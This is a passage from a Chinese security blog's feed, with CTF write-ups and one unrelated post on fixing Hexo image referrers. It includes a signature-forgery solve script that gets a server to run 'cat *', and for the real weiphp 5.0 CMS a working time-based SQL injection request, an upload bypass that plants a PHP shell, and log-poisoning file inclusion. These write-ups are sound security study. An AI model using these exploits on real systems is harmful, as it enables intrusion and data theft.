class="built_in">std</span>::setw(<span class="number">9</span>) &lt;&lt; tab1.size() &lt;&lt; <span class="string">"\x1b[0m "</span></span><br><span class="line">                      &lt;&lt; <span class="built_in">std</span>::flush;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">std</span>::this_thread::sleep_for(<span class="built_in">std</span>::chrono::milliseconds(<span class="number">100</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">"\x1b[31mneed IPv4 in argv[1]\x1b[0m"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="function"><span class="built_in">stringstream</span> <span class="title">ss</span><span class="params">(argv[<span class="number">1</span>])</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; v: ip) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">string</span> s;</span><br><span class="line">            <span class="built_in">std</span>::getline(ss, s, <span class="string">'.'</span>);</span><br><span class="line">            <span class="keyword">int</span> n = <span class="built_in">std</span>::atoi(s.c_str());</span><br><span class="line">            <span class="keyword">if</span> (n &lt; <span class="built_in">std</span>::numeric_limits&lt;<span class="keyword">uint8_t</span>&gt;::min() || n &gt; <span class="built_in">std</span>::numeric_limits&lt;<span class="keyword">uint8_t</span>&gt;::max())</span><br><span class="line">                <span class="keyword">goto</span> bad_ip;</span><br><span class="line">            v = n;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!ss) &#123;</span><br><span class="line">bad_ip:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">"\x1b[31mbad IPv4 given?\x1b[0m"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">"\x1b[31mneed commands in argv[2] and argv[3]\x1b[0m"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    cmd0 = argv[<span class="number">2</span>];</span><br><span class="line">    cmd1 = argv[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="function">thread <span class="title">status_thread</span><span class="params">(status)</span></span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::thread&gt; ts;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">unsigned</span> i = <span class="number">0</span>; i &lt; num_threads; ++i)</span><br><span class="line">        ts.push_back(<span class="built_in">std</span>::thread(go, i));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; t: ts)</span><br><span class="line">        t.join();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译可能会找不到 <code>lcrypto</code>，编译命令加上 lcrypto 路径（我本地是 /usr/local/opt/openssl/lib）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ -std=c++17 -march=native -O3 -lcrypto -lpthread gewalt.cpp -o gewalt -L/usr/<span class="built_in">local</span>/opt/openssl/lib</span><br></pre></td></tr></table></figure><p>与 go 交互的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys, requests, subprocess</span><br><span class="line"></span><br><span class="line">benign_cmd = <span class="string">'ls -l'</span></span><br><span class="line">exploit_cmd = <span class="string">'cat *'</span></span><br><span class="line"></span><br><span class="line">ip, port = sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>]</span><br><span class="line">url = <span class="string">'http://&#123;&#125;:&#123;&#125;'</span>.format(ip, port)</span><br><span class="line"></span><br><span class="line">my_ip = requests.get(url + <span class="string">'/ip'</span>).text</span><br><span class="line">print(<span class="string">'[+] IP: '</span> + my_ip)</span><br><span class="line"></span><br><span class="line">o = subprocess.check_output([<span class="string">'./gewalt'</span>, my_ip, benign_cmd, exploit_cmd])</span><br><span class="line">print(<span class="string">'[+] gewalt:'</span> + o.decode())</span><br><span class="line"></span><br><span class="line">payload = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> o.decode().splitlines():</span><br><span class="line">    ip, cmd = l.split(<span class="string">'|'</span>)</span><br><span class="line">    payload[<span class="string">'benign'</span> <span class="keyword">if</span> cmd == benign_cmd <span class="keyword">else</span> <span class="string">'pwn'</span>] = ip, cmd</span><br><span class="line"></span><br><span class="line">print(payload)</span><br><span class="line"></span><br><span class="line">sig  = requests.post(url + <span class="string">'/sign'</span>, data=&#123;<span class="string">'ip'</span>: payload[<span class="string">'benign'</span>][<span class="number">0</span>], <span class="string">'cmd'</span>: payload[<span class="string">'benign'</span>][<span class="number">1</span>]&#125;).text</span><br><span class="line">print(<span class="string">'[+] sig: '</span> + sig)</span><br><span class="line"></span><br><span class="line">r = requests.post(url + <span class="string">'/exec'</span>, data=&#123;<span class="string">'signature'</span>: sig[:<span class="number">172</span>] + payload[<span class="string">'pwn'</span>][<span class="number">0</span>]  + <span class="string">'|'</span> + payload[<span class="string">'pwn'</span>][<span class="number">1</span>]&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> ⚙  SaV-ls<span class="_">-l</span>-aaS  python solve.py 127.0.0.1 60601</span><br><span class="line">[+] IP: 172.17.0.1</span><br><span class="line">fffd fffd fffd fffd fffd fffd 55 fffd fffd fffd fffd c fffd fffd fffd fffd fffd fffd fffd fffd</span><br><span class="line"><span class="built_in">hash</span> count:  168104875 (2^27.32)</span><br><span class="line">kapot count: 3477222 (2^21.73)</span><br><span class="line">table sizes: 8745 8856</span><br><span class="line">[+] gewalt:00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000172.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000017.000000000000000000000000000000000000000000000000000000000000000000000000000000000.00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001|ls -l</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000172.17.000000000000000000000000.0000000000000000000000000000000000000001|cat *</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">'pwn'</span>: (u<span class="string">'00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000172.17.000000000000000000000000.0000000000000000000000000000000000000001'</span>, u<span class="string">'cat *'</span>), <span class="string">'benign'</span>: (u<span class="string">'00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000172.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000017.000000000000000000000000000000000000000000000000000000000000000000000000000000000.00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001'</span>, u<span class="string">'ls -l'</span>)&#125;</span><br><span class="line">[+] sig: ODxSukwtu4rHICBpzT23WGD7DCJNawhA0DUN/tcyv1AgwNmS8OPUnO5FnBBDgiaVx5OTYd4OjH8LVbKiXUBUBuFx1OHDgKBKG5umkKMLt+350SlgMWY5qWny9tPIU3I+X0A9FcADCBCi6f0PkXfc0CSCZXuFu9rAKnVGsbmaUwY=00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000172.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000017.000000000000000000000000000000000000000000000000000000000000000000000000000000000.00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001|ls -l</span><br><span class="line">hxp&#123;FLAG&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 XCTF FINALS weiphp5.0 漏洞挖掘</title>
      <link href="/2019/10/30/weiphp5-0/"/>
      <url>/2019/10/30/weiphp5-0/</url>
      
        <content type="html"><![CDATA[<p>在2019 XCTF FINALS，麦香师傅出了一个最新版 weiphp 漏洞挖掘，出题人表示漏洞太多了所以删了一部分代码orz，题目放出来貌似被日穿了orz（要日一个cms最好的办法感觉是放到CTF上）</p><a id="more"></a><p>默认应该是关闭了注册功能，正常情况下我们没有admin的密码是无法登录的。</p><h2 id="前台sql注入"><a href="#前台sql注入" class="headerlink" title="前台sql注入"></a>前台sql注入</h2><p>在/application/material/controller/Material 下material_lists方法，查询 title 处</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> $title = I(<span class="string">'title'</span>);</span><br><span class="line">        <span class="comment">// dump($title);exit;</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($title)) &#123;</span><br><span class="line">            $map[<span class="string">'title'</span>] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">'like'</span>,</span><br><span class="line">                <span class="string">"%$title%"</span></span><br><span class="line">            );</span><br><span class="line">            $where .= <span class="string">" and `title` like '%$title%'"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">$count = M()-&gt;query(<span class="string">"SELECT COUNT( distinct `group_id`) AS tp_count FROM `wp_material_news` WHERE &#123;$where&#125; LIMIT 1"</span>);</span><br><span class="line">$count = <span class="keyword">isset</span>($count[<span class="number">0</span>][<span class="string">'tp_count'</span>]) ? $count[<span class="number">0</span>][<span class="string">'tp_count'</span>] : <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>可以看到title没有任何过滤拼接到了sql语句里，这里因为只能影响 count 的值，后面显示的部分调用了模版函数来执行查询，所以考虑时间盲注。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/weiphp5.0/public/index.php/Material/Material/material_lists?title=aa%27or%20sleep(5)%23</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.211.55.5</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:45.0) Gecko/20100101 Firefox/45.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=gh5hemmrqmujnb10fg8hs29bq8; ScanLoginKey=5db913058c905; __forward__=%2F%2Fweiphp5.0%2Fpublic%2Findex.php%2FMaterial%2FMaterial%2Fmaterial_lists%3Ftitle%3D1</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 1</span><br><span class="line"></span><br><span class="line"><span class="attribute">a</span></span><br></pre></td></tr></table></figure><p>这里必须是 post，get 请求应该是会渲染模版会跳转登录。</p><p>发现sleep成功，扔到sqlmap就可以了</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-afce833fe26311ae.png" alt="image.png"></p><p>不过数据库里admin的密码我们也是解不出来的，因为weiphp使用如下方法入库：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">think_weiphp_md5</span><span class="params">($str, $key = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($key)) &#123;</span><br><span class="line">        $key = config(<span class="string">'database.data_auth_key'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span> === $str ? <span class="string">''</span> : md5(sha1($str) . $key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当时比赛的时候，开了debug模式，导致 wp_user 表里login_password 字段记录了admin的密码，所以直接能登后台了。。。</p><h2 id="免登录文件上传"><a href="#免登录文件上传" class="headerlink" title="免登录文件上传"></a>免登录文件上传</h2><p>首页源代码里：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-a94ec5b09af9dfef.png" alt="image.png"></p><p>访问upload_dialog_url，发现有可以上传，抓包得到上传包，发现要登录：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-03a037c4649dbc78.png" alt="image.png"></p><p>定位file控制器upload_picture方法，发现有鉴权：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_picture</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> 用户登录检测</span></span><br><span class="line">        <span class="keyword">if</span> (!is_login())&#123;</span><br><span class="line">        $return = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'status'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">            <span class="string">'info'</span> =&gt; <span class="string">'上传失败，请先登录'</span>,</span><br><span class="line">            <span class="string">'data'</span> =&gt; <span class="string">''</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">return</span> json($return);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>看到有个upload_root 方法没有鉴权，直接可以上传:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_root</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $return = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'status'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">    <span class="string">'info'</span> =&gt; <span class="string">'上传成功'</span>,</span><br><span class="line">    <span class="string">'data'</span> =&gt; <span class="string">''</span></span><br><span class="line">    );</span><br><span class="line">    <span class="comment">/* 调用文件上传组件上传文件 */</span></span><br><span class="line">    $File = D(<span class="string">'home/File'</span>);</span><br><span class="line">    $file_driver = strtolower(config(<span class="string">'picture_upload_driver'</span>));</span><br><span class="line">    $setting = <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">'rootPath'</span> =&gt; <span class="string">'./'</span> ,</span><br><span class="line">    );</span><br><span class="line">    $info = $File-&gt;upload($setting, config(<span class="string">'picture_upload_driver'</span>), config(<span class="string">"upload_&#123;$file_driver&#125;_config"</span>));</span><br><span class="line"><span class="comment">//     $info = $File-&gt;upload(config('download_upload'), config('picture_upload_driver'), config("upload_&#123;$file_driver&#125;_config"));</span></span><br><span class="line">    <span class="comment">/* 记录附件信息 */</span></span><br><span class="line">    <span class="keyword">if</span> ($info) &#123;</span><br><span class="line">    $return[<span class="string">'status'</span>] = <span class="number">1</span>;</span><br><span class="line">    $return = array_merge($info[<span class="string">'download'</span>], $return);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $return[<span class="string">'status'</span>] = <span class="number">0</span>;</span><br><span class="line">    $return[<span class="string">'info'</span>] = $File-&gt;getError();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 返回JSON数据 */</span></span><br><span class="line">    <span class="keyword">return</span> json_encode($return);</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里用php5就可以绕过：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-75670a9b451493ef.png" alt="image.png"></p><p>成功上传，文件路径<code>/public/uploads/download/20191030/5db9681e2d701.php5</code></p><h2 id="登录后台文件上传"><a href="#登录后台文件上传" class="headerlink" title="登录后台文件上传"></a>登录后台文件上传</h2><p>登录后upload处随便传，同样用php5或者php7就行：</p><p>upload_picture处应该有后缀名白名单。</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-92dec9c7072c0adb.png" alt="image.png"></p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>出题人预期解是<code>/application/common/controller/base.php</code>中的<code>common_lists</code>方法，$templateFile可以通过参数绑定方式控制，用ua头把命令写日志里然后包含日志执行命令。</p><p>这个cms洞确实比较多，不登录也能传shell，也能sql注入… admin管理后台估计还有洞。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo图片外链被限制解决方法</title>
      <link href="/2019/10/29/hexo%E5%9B%BE%E7%89%87%E5%A4%96%E9%93%BE%E8%A2%AB%E9%99%90%E5%88%B6%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
      <url>/2019/10/29/hexo%E5%9B%BE%E7%89%87%E5%A4%96%E9%93%BE%E8%A2%AB%E9%99%90%E5%88%B6%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>使用 hexo+github 搭建博客，图片成为一个头疼的问题，如果放在相对目录上，那么图片会占用空间，文章多了加载会变慢，所以我一直使用简书的图床。</p><p>但是发现hexo里加载不出简书图床上的图片，搜索了一波发现微博图床也有类似的问题，找到了原因，具体参考：</p><a id="more"></a><p><a href="https://blog.gobyte.cn/post/cfce32d8.html" target="_blank" rel="noopener">https://blog.gobyte.cn/post/cfce32d8.html</a></p><p>但是上述链接的脚本：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> link = <span class="string">""</span> ;</span><br><span class="line"><span class="comment">// 遍历所有的img标签</span></span><br><span class="line">$(<span class="string">"img"</span>).each( <span class="function">(<span class="params">i,o</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">var</span> o = $(o);</span><br><span class="line">    <span class="comment">// 判断图片的链接是否包含sinaimg关键字</span></span><br><span class="line"><span class="keyword">if</span>( o.attr(<span class="string">"src"</span>).indexOf(<span class="string">"sinaimg"</span>) &gt; <span class="number">0</span> )&#123;</span><br><span class="line">        <span class="comment">// 给这个标签加上referrerPlicy属性</span></span><br><span class="line">o.attr(<span class="string">"referrerpolicy"</span>,<span class="string">"no-referrer"</span>);</span><br><span class="line">        <span class="comment">// 备份图片的src</span></span><br><span class="line">link = o.attr(<span class="string">"src"</span>);</span><br><span class="line">        <span class="comment">// 重新设置src，让页面重新加载一次图片</span></span><br><span class="line">o.attr(<span class="string">"src"</span>,link);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>我发现并不好用，经过调试发现$(“img”)并不能取得页面所有的im g标签，我换成了<code>document.getElementsByTagName(&#39;img&#39;)</code>的形式，可以取得所有的 img 标签（我用的是简书图床，所以关键字是jianshu）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> link=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">var</span> a = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'img'</span>);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;a.length;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>((a[i].src).indexOf(<span class="string">"jianshu"</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        a[i].referrerpolicy=<span class="string">'no-referrer'</span>;</span><br><span class="line">        link = a[i].src;</span><br><span class="line">        a[i].src = link;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是发现还是无效，一顿调试发现浏览器根本不像代码注释那样面重新加载一次图片，而是使用原来的缓存（检测到src没有改变），遂参考如下链接：<a href="https://blog.csdn.net/maoxunxing/article/details/40618617" target="_blank" rel="noopener">https://blog.csdn.net/maoxunxing/article/details/40618617</a> 解决。</p><p>由于直接从上传到简书图床获得的链接中已经有?与参数，所以要把原先链接的?及后面参数删除（不影响显示图片）。</p><p>改上去发现还是不好使orz，继续调试发现img的标签referrerpolicy已经是no-referrer，抓包还是会有refer头，问题出在这里，一顿测后来在文档里发现属性应该是referrerPolicy…大写的P，没写过前端的痛。</p><p>贴上最终好用的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> link=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">var</span> a = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'img'</span>);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;a.length;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>((a[i].src).indexOf(<span class="string">"jianshu"</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        a[i].referrerPolicy=<span class="string">'no-referrer'</span>;</span><br><span class="line">        link = a[i].src;</span><br><span class="line">        a[i].src = link+<span class="string">'?t='</span>+<span class="built_in">Math</span>.random();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 解决方法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 de1ctf</title>
      <link href="/2019/08/04/2019-de1ctf/"/>
      <url>/2019/08/04/2019-de1ctf/</url>
      
        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="SSRF-Me"><a href="#SSRF-Me" class="headerlink" title="SSRF Me"></a>SSRF Me</h3><p>题目直接给了源码：</p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span 